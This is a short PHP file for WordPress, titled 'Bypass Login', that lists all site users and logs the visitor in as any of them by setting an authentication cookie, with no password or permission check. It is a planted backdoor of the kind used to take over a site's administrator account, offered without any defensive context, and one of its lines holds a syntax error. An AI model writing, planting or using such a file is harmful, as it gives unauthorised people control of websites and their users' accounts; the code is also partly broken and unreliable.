<?php
// 加载WordPress
require_once(dirname(__FILE__) . '/wp-load.php');

// 检查用户请求
if(isset($_GET['user'])) {
    $user = get_user_by('login', sanitize_user($_GET['user']));
    if($user) {
        wp_set_auth_cookie($user->ID, true);
        echo 'Logged in as '.$user->user_login;
        echo '<br><a href="'.admin_url()">Go to Admin</a>';
    } else {
        echo 'User not found';
    }
} else {
    echo '<h2>Bypass Login</h2><form><input name="user" placeholder="Username"><button>Login</button></form><h2>Users</h2><ul>';
    foreach(get_users() as $u) {
        echo '<li><a href="?user='.$u->user_login.'">'.$u->user_login.'</a></li>';
    }
    echo '</ul>';
}
